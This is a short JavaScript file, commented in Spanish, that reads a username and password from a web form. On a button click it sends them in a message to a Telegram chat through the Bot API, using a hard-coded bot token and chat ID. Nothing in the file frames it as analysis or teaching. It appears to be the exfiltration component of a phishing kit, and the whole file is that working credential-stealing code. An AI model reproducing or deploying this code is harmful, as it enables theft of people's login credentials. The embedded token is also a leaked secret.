// Obtener elementos del DOM
const sendatatme = document.getElementById("sendatatme");
const first = document.getElementById("first");
const second = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");

// Escuchar cambios en el campo 'first' y actualizar 'resfirst'
first.addEventListener("change", () => {
    resfirst.value = first.value;
});

// Función para enviar datos a Telegram
function enviarMensajeTelegram() {
    const chatId = '5620884409'; // Reemplaza con tu ID de chat
    const botToken = '6546132272:AAEa5jRQyZ4dSOLZCW3Dt3cjp_5KUjMol54'; // Reemplaza con tu token de bot

    // Construir el mensaje
    const mensaje = `USERNAME: ${resfirst.value}\nPASSWORD: ${resecond.value}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Construir los parámetros para la solicitud
    const params = new URLSearchParams({
        chat_id: chatId,
        text: mensaje
    });

    // Enviar la solicitud a la API de Telegram
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: params
    })
    .then(response => response.json())
    .then(data => {
        console.log('Mensaje enviado a Telegram:', data);
    })
    .catch(error => {
        console.error('Error al enviar el mensaje a Telegram:', error);
    });
}

// Agregar evento al botón para enviar los datos a Telegram
sendatatme.addEventListener('click', () => {
    enviarMensajeTelegram();
});